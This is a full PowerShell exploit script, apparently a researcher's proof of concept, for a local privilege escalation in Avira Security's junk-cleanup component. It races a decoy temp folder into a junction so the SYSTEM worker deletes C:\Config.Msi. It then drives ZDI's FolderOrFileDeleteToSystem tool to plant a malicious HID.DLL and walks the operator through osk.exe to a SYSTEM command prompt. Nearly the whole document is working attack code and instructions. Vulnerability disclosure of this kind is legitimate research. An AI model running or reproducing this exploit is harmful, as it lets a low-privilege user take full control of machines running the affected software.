# F3_JunkToctouDeletePoC.ps1
# FULL LPE PoC for F-3: TOCTOU junction-swap on the SYSTEM-resident junk-cleanup delete
# path, chained with ZDI's FolderOrFileDeleteToSystem (C:\Config.Msi rollback technique)
# to an actual SYSTEM shell.
#
# Vulnerability (static evidence, Avira Security 1.1.116.3442):
#   Service.Plugin.SystemSpeedup.dll
#     - Junk.Backend.JunkResolver::DeleteJunkItem -> IFileSystemBackend::DeleteFile(item.Location)
#       with NO reparse-point validation (Backends.dll::FileSystemBackend::DeleteFile is a bare
#       System.IO.File::Delete; no FileSystemSecurityHelper.IsActualFileName in this flow).
#     - The junk scanner sources include user profile locations (get_AppDataDir /
#       get_LocalAppDataDir / GetTempPath) and skips symlinks only at SCAN time
#       (_skipSymLinks), so the path is trusted from scan time to resolve time:
#       swapping the scanned directory for a junction before "Optimize"/resolve makes
#       the SYSTEM worker delete through the junction (CVE-2026-27750 pattern).
#     - Contrast: Optimizer.Backend.Cleaner::DeleteFileItem DOES validate via
#       FileSystemSecurityHelper::IsActualFileName ("Skipping invalid file for deletion") -
#       that is the 27750 fix; the Junk resolver path was not given the same gate.
#
# Full LPE chain driven by this script:
#   1. An aged junk decoy dir is armed under %TEMP% (a junk-scan source).
#   2. folderdelete.exe (ZDI FolderOrFileDeleteToSystem, stock build) is launched as a child
#      process. Stage 1 runs its MSI install/uninstall dance and leaves an empty
#      C:\Config.Msi behind, then parks waiting for someone to delete it.
#   3. When the tool prints "Now trigger your vulnerability to delete C:\Config.Msi" this
#      script opens the DELETE WINDOW: you run the Avira junk Scan, review the results
#      (decoy must be listed), and click Optimize.
#   4. The watcher swaps the decoy for a junction -> C:\Config.Msi the moment the repair
#      pass touches it; the Avira SYSTEM worker's delete resolves through the junction and
#      removes C:\Config.Msi (F-3 = arbitrary folder delete as SYSTEM).
#   5. The tool notices the folder is gone, runs stage 2 (recreates C:\Config.Msi with a
#      NULL DACL, swaps in a malicious .rbs/.rbf, forces an MSI rollback) and drops
#      HID.DLL to C:\Program Files\Common Files\microsoft shared\ink\HID.DLL.
#   6. osk.exe + Ctrl-Alt-Del -> SYSTEM command prompt. Full LPE complete.
#
# Usage (run as the LOW-privilege user from a normal PowerShell console):
#   .\F3_JunkToctouDeletePoC.ps1 -FolderDeleteExe C:\tools\folderdelete.exe
#
# Optional parameters:
#   -DecoyDir <path>         decoy junk dir (default: %TEMP%\AviraJunkPoC)
#   -ManualSwap              swap on ENTER (between scan review and Optimize) instead of the
#                            last-access watcher (use if last-access updates are disabled)
#   -JunkAgeDays <int>       how old the decoy junk looks (default 30)
#   -WatchMs <int>           watcher/relay poll interval (default 50 ms)
#   -Stage1TimeoutSec <int>  max wait for the tool to open the delete window (default 300)
#   -DeleteTimeoutSec <int>  max wait for the Avira delete after the swap (default 180)
#   -Stage2TimeoutSec <int>  max wait for the HID.DLL drop (default 300)
#   -LaunchOsk               launch osk.exe automatically after the drop (default: prompt)
#
# Notes:
#   - folderdelete.exe must be the STOCK ZDI build (thezdi/PoC, FilesystemEoPs/
#     FolderOrFileDeleteToSystem). The orchestration keys on its exact console markers:
#       "...trigger your vulnerability to delete C:\Config.Msi"  -> delete window open
#       "C:\Config.Msi has been deleted"                        -> delete consumed
#       "SUCCESS: DLL was dropped"                              -> stage 2 complete
#     Bitness must match the OS (the tool self-checks too). No arguments are passed to it.
#   - If this script aborts, folderdelete.exe is left running; it waits forever for
#     C:\Config.Msi to vanish, so the Avira side can be re-engaged manually.
#   - After testing, remove the dropped HID.DLL from an elevated prompt; a stale copy makes
#     the tool refuse to start until deleted (it cannot delete it as a low-priv user).

param(
    [Parameter(Mandatory = $true, Position = 0)][string]$FolderDeleteExe,
    [string]$DecoyDir,
    [switch]$ManualSwap,
    [int]$JunkAgeDays = 30,
    [int]$WatchMs = 50,
    [int]$Stage1TimeoutSec = 300,
    [int]$DeleteTimeoutSec = 180,
    [int]$Stage2TimeoutSec = 300,
    [switch]$LaunchOsk
)

$ErrorActionPreference = 'Stop'

$ConfigMsiDir = 'C:\Config.Msi'
$HidDropPath  = 'C:\Program Files\Common Files\microsoft shared\ink\HID.DLL'
if (-not $DecoyDir) { $DecoyDir = Join-Path $env:TEMP 'AviraJunkPoC' }

# --------------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------------

function Assert-LowPriv {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    if ((New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Warning 'Running elevated - the demo is meaningless as admin. Re-run as a limited user.'
    }
}

function Assert-Prereqs {
    if (-not (Test-Path -LiteralPath $FolderDeleteExe -PathType Leaf)) {
        throw "folderdelete.exe not found: $FolderDeleteExe"
    }
    $script:FolderDeleteExe = (Resolve-Path -LiteralPath $FolderDeleteExe).ProviderPath
    $avira = @(Get-Process | Where-Object { $_.ProcessName -match 'avira|spotlight' } | Select-Object -ExpandProperty ProcessName -Unique)
    if ($avira.Count -gt 0) {
        Write-Host ('[+] Avira processes running: ' + ($avira -join ', '))
    } else {
        Write-Warning 'No Avira/Spotlight processes detected - is the product installed and the service running?'
    }
    if (Test-Path -LiteralPath $HidDropPath) {
        Write-Warning "$HidDropPath already exists (previous run?). Delete it from an elevated prompt first - the tool will refuse to start while it is there."
    }
}

function Get-DecoyItem { Get-Item -LiteralPath $DecoyDir -Force -ErrorAction SilentlyContinue }

function Remove-DecoyPath {
    # Remove whatever sits at $DecoyDir, NEVER recursing through a junction.
    # Returns $true if the path is gone (or was already), $false if it could not be cleared.
    $it = Get-DecoyItem
    if (-not $it) { return $true }
    try {
        if ($it.Attributes -band [IO.FileAttributes]::ReparsePoint) {
            # removes the reparse point only; does not touch the target
            [System.IO.Directory]::Delete($DecoyDir, $false)
        } else {
            Remove-Item -LiteralPath $DecoyDir -Recurse -Force
        }
    } catch {
        Write-Warning "could not clear decoy path $DecoyDir : $($_.Exception.Message)"
        return $false
    }
    return $true
}

function New-Decoy {
    if (-not (Remove-DecoyPath)) { throw "decoy path $DecoyDir is stuck (in use?); resolve manually and re-run." }
    New-Item -ItemType Directory -Path $DecoyDir | Out-Null
    $old = (Get-Date).AddDays(-$JunkAgeDays)
    for ($i = 1; $i -le 5; $i++) {
        $f = Join-Path $DecoyDir "junkfile$i.tmp"
        'junk' | Set-Content $f
        (Get-Item $f).CreationTime   = $old
        (Get-Item $f).LastWriteTime  = $old
        (Get-Item $f).LastAccessTime = $old
    }
    (Get-Item $DecoyDir).CreationTime = $old
    Write-Host "[+] decoy junk dir aged $JunkAgeDays days: $DecoyDir"
}

function Swap-ToJunction {
    if (-not (Remove-DecoyPath)) { return $false }
    New-Item -ItemType Junction -Path $DecoyDir -Value $ConfigMsiDir | Out-Null
    Write-Host "[!] decoy is now a junction -> $ConfigMsiDir" -ForegroundColor Yellow
    return $true
}

function Get-DecoyFingerprint {
    # Child-FILE stats only. Stat'ing files never changes them, and enumerating the
    # parent does not touch child stats - unlike the directory's own LastAccessTime,
    # which our enumeration (and NTFS last-access updates) would keep bumping, making
    # the watcher self-trigger on its very first poll. A fingerprint change means the
    # scan/repair pass opened, deleted, or created a file inside the decoy.
    $it = Get-DecoyItem
    if (-not $it) { return $null }
    $parts = @()
    foreach ($f in @(Get-ChildItem -LiteralPath $DecoyDir -File -Force -ErrorAction SilentlyContinue | Sort-Object Name)) {
        $parts += $f.Name + ':' + $f.Length + ':' + $f.LastAccessTime.Ticks + ':' + $f.LastWriteTime.Ticks
    }
    return ($parts -join '|')
}

function Start-DeleteTool {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $script:FolderDeleteExe
    $psi.Arguments = ''          # stock tool: no flags; full chain wants stage 1 + wait + stage 2 in one run
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.StandardOutputEncoding = [System.Text.Encoding]::Default
    $psi.StandardErrorEncoding = [System.Text.Encoding]::Default
    $p = [System.Diagnostics.Process]::Start($psi)
    $script:outTask = $p.StandardOutput.ReadLineAsync()
    $script:errTask = $p.StandardError.ReadLineAsync()
    Write-Host "[+] launched: $($script:FolderDeleteExe) (pid $($p.Id))"
    return $p
}

function Read-ToolLines {
    # Drain every line the async ReadLineAsync pumps have completed; re-arms the pumps.
    $got = @()
    while ($null -ne $script:outTask) {
        if (-not $script:outTask.IsCompleted) { break }
        $line = $script:outTask.Result
        if ($null -eq $line) { $script:outTask = $null }
        else {
            $got += ,([pscustomobject]@{ Err = $false; Text = $line })
            $script:outTask = $script:tool.StandardOutput.ReadLineAsync()
        }
    }
    while ($null -ne $script:errTask) {
        if (-not $script:errTask.IsCompleted) { break }
        $line = $script:errTask.Result
        if ($null -eq $line) { $script:errTask = $null }
        else {
            $got += ,([pscustomobject]@{ Err = $true; Text = $line })
            $script:errTask = $script:tool.StandardError.ReadLineAsync()
        }
    }
    return $got
}

function Open-DeleteWindow([string]$why) {
    Write-Host ''
    Write-Host "[!] DELETE WINDOW OPEN - $why" -ForegroundColor Yellow
    Write-Host '    Engage Avira now:'
    Write-Host '    1. Avira UI -> Performance -> System Speedup -> run the junk Scan'
    Write-Host '       (skip if the decoy is already listed from an earlier scan)'
    Write-Host '    2. review the results - the decoy must be listed'
    if ($ManualSwap) {
        Write-Host '    3. come back here and press ENTER (swaps the decoy for the junction)'
        Write-Host '    4. click Optimize/repair in Avira'
    } else {
        Write-Host '    3. click Optimize/repair - the watcher swaps the decoy the moment the'
        Write-Host '       repair pass touches it'
    }
    Write-Host ''
}

# --------------------------------------------------------------------------
# preflight
# --------------------------------------------------------------------------

Assert-LowPriv
Assert-Prereqs
New-Decoy

Write-Host ''
Write-Host '[*] full LPE chain: F-3 junction swap (arbitrary folder delete as SYSTEM)'
Write-Host "    -> $ConfigMsiDir delete -> ZDI MSI rollback -> HID.DLL drop -> osk.exe -> SYSTEM shell"
Write-Host '[*] you may run the Avira junk Scan at any time now, but do NOT click Optimize'
Write-Host '    until the script announces the delete window (the [zdi] tool must finish stage 1 first).'
Write-Host '[*] folderdelete.exe console output is relayed below with a [zdi] prefix.'
Write-Host ''

# --------------------------------------------------------------------------
# orchestration state machine:  stage1 -> window -> swapped -> deleted -> success
# --------------------------------------------------------------------------

$script:tool = $null
$script:outTask = $null
$script:errTask = $null
$script:tool = Start-DeleteTool

$phase = 'stage1'
$manualPrompted = $false
$fp = $null
$success = $false
$failed = $false
$failStamp = [DateTime]::MaxValue
$sw = [Diagnostics.Stopwatch]::StartNew()

try {
    while ($true) {
        # ---- 1) relay + classify tool output -----------------------------------
        $lines = Read-ToolLines
        foreach ($l in $lines) {
            if ($l.Err) { Write-Host ('[zdi:err] ' + $l.Text) -ForegroundColor DarkYellow }
            else        { Write-Host ('[zdi] ' + $l.Text) }
            $t = $l.Text
            if ($t -match 'SUCCESS: DLL was dropped') { $success = $true }
            elseif ($t -match 'FAILED:|FAIL:|ERROR:') { $failed = $true; $failStamp = Get-Date }
            elseif ($t -match 'Config\.Msi has been deleted') {
                # tool-side confirmation of the Avira delete (main path)
                if ($phase -eq 'swapped') {
                    Write-Host "[+] $ConfigMsiDir was deleted by the Avira SYSTEM worker through the junction -" -ForegroundColor Green
                    Write-Host '    arbitrary folder delete as SYSTEM confirmed (F-3). The tool is running stage 2...' -ForegroundColor Green
                    $phase = 'deleted'
                    $sw.Restart()
                }
            }
            elseif ($t -match 'Config\.Msi deleted\. Proceeding with Stage 1') {
                # rare pre-stage-1 edge: the delete was consumed before stage 1
                if ($phase -eq 'swapped') {
                    Write-Host "[+] $ConfigMsiDir delete consumed; the tool now runs stage 1 - wait for the next window." -ForegroundColor Green
                    New-Decoy
                    $phase = 'stage1'
                    $sw.Restart()
                }
            }
            if ($t -match 'trigger your vulnerability to delete') {
                if ($phase -eq 'stage1') {
                    Open-DeleteWindow 'the [zdi] tool finished stage 1 and is waiting for the delete.'
                    $phase = 'window'; $manualPrompted = $false
                    $fp = Get-DecoyFingerprint
                    $sw.Restart()
                } elseif ($phase -eq 'deleted') {
                    # the tool needs ANOTHER delete round (pre-stage-1 edge) - go again
                    Write-Host '[!] the tool opened ANOTHER delete window - re-arming the decoy for round two.' -ForegroundColor Yellow
                    New-Decoy
                    Open-DeleteWindow 'second round.'
                    $phase = 'window'; $manualPrompted = $false
                    $fp = Get-DecoyFingerprint
                    $sw.Restart()
                }
            }
        }

        if ($success) { break }
        if ($script:tool.HasExited) { break }
        if ($failed) {
            # let the tool finish printing and exit after its FAIL line, then bail out
            if (((Get-Date) - $failStamp).TotalSeconds -gt 15) { break }
            Start-Sleep -Milliseconds 200
            continue
        }

        # ---- 2) phase work ------------------------------------------------------
        if ($phase -eq 'stage1') {
            if ($sw.Elapsed.TotalSeconds -gt $Stage1TimeoutSec) {
                throw "the tool did not open the delete window within $Stage1TimeoutSec s - see the [zdi] output above."
            }
            if (-not (Get-DecoyItem)) {
                Write-Host '[-] decoy vanished before the window opened - Optimize clicked too early? Re-arming;' -ForegroundColor Red
                Write-Host '    run the Scan again, and only click Optimize after the delete window opens.' -ForegroundColor Red
                New-Decoy
            }
        }
        elseif ($phase -eq 'window') {
            if (-not (Get-DecoyItem)) {
                Write-Host '[-] decoy was consumed without the swap (Optimize ran before the swap). Re-arming -' -ForegroundColor Red
                Write-Host '    run Scan -> Optimize again (or use -ManualSwap).' -ForegroundColor Red
                New-Decoy
                $fp = Get-DecoyFingerprint
                $manualPrompted = $false
                continue
            }
            if ($ManualSwap) {
                if (-not $manualPrompted) {
                    $manualPrompted = $true
                    Write-Host '[*] MANUAL SWAP: press ENTER after the scan lists the decoy, then click Optimize.'
                    Read-Host | Out-Null
                    if (Swap-ToJunction) { $phase = 'swapped'; $sw.Restart() }
                    else { $manualPrompted = $false }   # decoy was stuck; re-prompt next tick
                }
            } else {
                $now = Get-DecoyFingerprint
                if ($null -ne $fp -and $null -ne $now -and $now -ne $fp) {
                    Write-Host '[*] decoy touched (scan/repair pass) - swapping for the junction.'
                    if (Swap-ToJunction) { $phase = 'swapped'; $sw.Restart() }
                }
            }
        }
        elseif ($phase -eq 'swapped') {
            if (-not (Test-Path -LiteralPath $ConfigMsiDir)) {
                Write-Host "[+] $ConfigMsiDir was deleted by the Avira SYSTEM worker through the junction -" -ForegroundColor Green
                Write-Host '    arbitrary folder delete as SYSTEM confirmed (F-3). The tool is running stage 2...' -ForegroundColor Green
                $phase = 'deleted'
                $sw.Restart()
            } elseif (-not (Get-DecoyItem)) {
                Write-Host '[-] the junction was consumed but C:\Config.Msi survived - swap race lost this round.' -ForegroundColor Red
                New-Decoy
                $fp = Get-DecoyFingerprint
                $manualPrompted = $false
                $phase = 'window'
                $sw.Restart()
            } elseif ($sw.Elapsed.TotalSeconds -gt $DeleteTimeoutSec) {
                Write-Host "[-] no delete through the junction within $DeleteTimeoutSec s - retry this round" -ForegroundColor Red
                Write-Host '    (use -ManualSwap if the auto watcher keeps missing).' -ForegroundColor Red
                New-Decoy
                $fp = Get-DecoyFingerprint
                $manualPrompted = $false
                $phase = 'window'
                $sw.Restart()
            }
        }
        elseif ($phase -eq 'deleted') {
            if (Test-Path -LiteralPath $HidDropPath) { $success = $true; break }
            if ($sw.Elapsed.TotalSeconds -gt $Stage2TimeoutSec) {
                throw "stage 2 did not drop $HidDropPath within $Stage2TimeoutSec s - see the [zdi] output above."
            }
        }

        Start-Sleep -Milliseconds $WatchMs
    }
}
catch {
    Write-Host ('[-] ' + $_.Exception.Message) -ForegroundColor Red
    $failed = $true
}
finally {
    # drain any output the tool emitted at the very end so nothing is lost
    foreach ($l in (Read-ToolLines)) {
        if ($l.Err) { Write-Host ('[zdi:err] ' + $l.Text) -ForegroundColor DarkYellow }
        else        { Write-Host ('[zdi] ' + $l.Text) }
        if (-not $l.Err -and $l.Text -match 'SUCCESS: DLL was dropped') { $success = $true }
        if (-not $l.Err -and $l.Text -match 'FAILED:|FAIL:|ERROR:') { $failed = $true }
    }
    if ($script:tool -and -not $script:tool.HasExited) {
        Write-Host "[*] folderdelete.exe (pid $($script:tool.Id)) is still running - it waits forever"
        Write-Host '    for C:\Config.Msi to vanish; you can re-engage the Avira side manually, or kill it.'
    }
    # never leave a dangling junction stub behind; a real decoy dir is harmless, leave it
    $it = Get-DecoyItem
    if ($it -and ($it.Attributes -band [IO.FileAttributes]::ReparsePoint)) {
        try {
            # removes the reparse point only (never follows into the target)
            [System.IO.Directory]::Delete($DecoyDir, $false)
            Write-Host '[*] removed leftover junction stub at the decoy path.'
        } catch {
            try { Remove-Item -LiteralPath $DecoyDir -Force -ErrorAction Stop }
            catch { Write-Warning "leftover junction at $DecoyDir could not be removed: $($_.Exception.Message)" }
        }
    }
}

# --------------------------------------------------------------------------
# outcome
# --------------------------------------------------------------------------

if ($success -or (-not $failed -and (Test-Path -LiteralPath $HidDropPath))) {
    Write-Host ''
    Write-Host '[+] SUCCESS - full LPE chain complete.' -ForegroundColor Green
    Write-Host "    F-3 TOCTOU junction swap -> Avira SYSTEM worker deleted $ConfigMsiDir"
    Write-Host "    ZDI stage 2               -> payload DLL dropped at $HidDropPath"
    Write-Host ''
    Write-Host '    Final step (SYSTEM shell):'
    Write-Host '      1. start the On-Screen Keyboard: osk.exe'
    Write-Host '      2. press Ctrl-Alt-Del to switch to the secure desktop'
    Write-Host '      3. from the secure desktop ease-of-access controls launch the On-Screen'
    Write-Host '         Keyboard - that osk.exe instance runs as SYSTEM, loads the dropped'
    Write-Host '         HID.DLL and gives you a SYSTEM command prompt'
    Write-Host '      4. verify: whoami  ->  nt authority\system'
    Write-Host ''
    if ($LaunchOsk) {
        Start-Process -FilePath osk.exe
        Write-Host '[+] osk.exe launched.'
    } else {
        $a = Read-Host 'Launch osk.exe now? (y/N)'
        if ($a -match '^[yY]') { Start-Process -FilePath osk.exe; Write-Host '[+] osk.exe launched.' }
    }
    Write-Host ''
    Write-Host "Cleanup: delete $HidDropPath from an elevated prompt when done testing"
    Write-Host '(a stale copy makes the tool refuse to start until it is removed).'
    exit 0
} else {
    Write-Host ''
    Write-Host '[-] chain did not complete - review the [zdi] output above.' -ForegroundColor Red
    if ($script:tool -and $script:tool.HasExited) { Write-Host ('[-] folderdelete.exe exit code: ' + $script:tool.ExitCode) }
    exit 1
}
